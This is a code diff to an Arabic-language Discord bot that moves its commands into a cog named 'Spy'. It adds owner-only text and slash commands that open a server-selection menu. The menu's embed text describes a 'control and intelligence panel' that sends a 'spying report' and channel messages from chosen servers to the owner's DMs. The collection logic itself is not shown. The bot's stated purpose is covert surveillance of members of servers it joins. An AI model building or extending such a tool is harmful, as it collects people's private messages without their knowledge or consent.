@@ -1,28 +1,47 @@
-import os
 import discord
 from discord.ext import commands
 from datetime import datetime, timedelta, timezone
 
-DISCORD_TOKEN = os.getenv("DISCORD_TOKEN")
-
-intents = discord.Intents.default()
-intents.message_content = True
-intents.members = True 
-intents.moderation = True
-intents.guilds = True
-
-bot = commands.Bot(command_prefix="!", intents=intents)
-
 OWNER_ID = 1107355943408259112
 
-@bot.event
-async def on_ready():
-    try:
-        await bot.tree.sync()
-        print("🔄 تم مزامنة أوامر السلاش بنجاح.")
-    except Exception as e:
-        print(f"⚠️ فشل مزامنة الأوامر: {e}")
-    print(f"🚀 | نظام التجسس شغال وبكامل الكفاءة: {bot.user.name}")
+class Spy(commands.Cog):
+    def __init__(self, bot):
+        self.bot = bot
+
+    @commands.command(name="سيرفر", aliases=["servers", "سيرفرات"])
+    async def list_servers(self, ctx):
+        if ctx.author.id != OWNER_ID:
+            return  
+
+        if not self.bot.guilds:
+            await ctx.send("عيوني فهد، أنا لست منضماً إلى أي سيرفر حالياً.")
+            return
+
+        view = ServerView(self.bot)
+        embed = discord.Embed(
+            title="🕵️‍♂️ لوحة سيطرة واستخبارات نوفا المتطورة",
+            description="اختر السيرفر المطلوب ليصلك تقرير التجسس ورسائل القنوات مباشرة إلى **رسائلك الخاصة (DM)**:",
+            color=0x2b2d31
+        )
+        await ctx.send(embed=embed, view=view, delete_after=180)
+
+    @commands.hybrid_command(name="سيرفر", description="عرض لوحة تحكم واستخبارات السيرفرات (خاص بفهد فقط)")
+    async def slash_servers(self, ctx: commands.Context):
+        if ctx.author.id != OWNER_ID:
+            await ctx.send("عذراً، لا أملك الصلاحية لعرض هذه المعلومات، هذه الأوامر خاصة جداً وليست متاحة للعامة.", ephemeral=True)
+            return
+
+        if not self.bot.guilds:
+            await ctx.send("عيوني فهد، أنا لست منضماً إلى أي سيرفر حالياً.", ephemeral=True)
+            return
+
+        view = ServerView(self.bot)
+        embed = discord.Embed(
+            title="🕵️‍♂️ لوحة سيطرة واستخبارات نوفا المتطورة",
+            description="اختر السيرفر المطلوب ليصلك تقرير التجسس ورسائل القنوات مباشرة إلى **رسائلك الخاصة (DM)**:",
+            color=0x2b2d31
+        )
+        await ctx.send(embed=embed, view=view, ephemeral=True)
 
 class ServerSelect(discord.ui.Select):
     def __init__(self, bot_instance):
@@ -337,43 +356,5 @@ class ServerView(discord.ui.View):
         super().__init__(timeout=None)
         self.add_item(ServerSelect(bot_instance))
 
-# 1. الأمر النصي التقليدي (!سيرفر)
-@bot.command(name="سيرفر", aliases=["servers", "سيرفرات"])
-async def list_servers(ctx):
-    if ctx.author.id != OWNER_ID:
-        await ctx.send("عذراً، لا أملك الصلاحية لعرض هذه المعلومات، هذه الأوامر خاصة جداً وليست متاحة للعامة.")
-        return  
-
-    if not bot.guilds:
-        await ctx.send("عيوني فهد، أنا لست منضماً إلى أي سيرفر حالياً.")
-        return
-
-    view = ServerView(bot)
-    embed = discord.Embed(
-        title="🕵️‍♂️ لوحة سيطرة واستخبارات نوفا المتطورة",
-        description="اختر السيرفر المطلوب ليصلك تقرير التجسس ورسائل القنوات مباشرة إلى **رسائلك الخاصة (DM)**:",
-        color=0x2b2d31
-    )
-    await ctx.send(embed=embed, view=view, delete_after=180)
-
-# 2. أمر السلاش الجديد (/سيرفر)
-@bot.tree.command(name="سيرفر", description="عرض لوحة تحكم واستخبارات السيرفرات (خاص بفهد فقط)")
-async def slash_servers(interaction: discord.Interaction):
-    if interaction.user.id != OWNER_ID:
-        await interaction.response.send_message("عذراً، لا أملك الصلاحية لعرض هذه المعلومات، هذه الأوامر خاصة جداً وليست متاحة للعامة.", ephemeral=True)
-        return
-
-    if not bot.guilds:
-        await interaction.response.send_message("عيوني فهد، أنا لست منضماً إلى أي سيرفر حالياً.", ephemeral=True)
-        return
-
-    view = ServerView(bot)
-    embed = discord.Embed(
-        title="🕵️‍♂️️ لوحة سيطرة واستخبارات نوفا المتطورة",
-        description="اختر السيرفر المطلوب ليصلك تقرير التجسس ورسائل القنوات مباشرة إلى **رسائلك الخاصة (DM)**:",
-        color=0x2b2d31
-    )
-    await interaction.response.send_message(embed=embed, view=view, ephemeral=True)
-
-if __name__ == "__main__":
-    bot.run(DISCORD_TOKEN)
+async def setup(bot):
+    await bot.add_cog(Spy(bot))
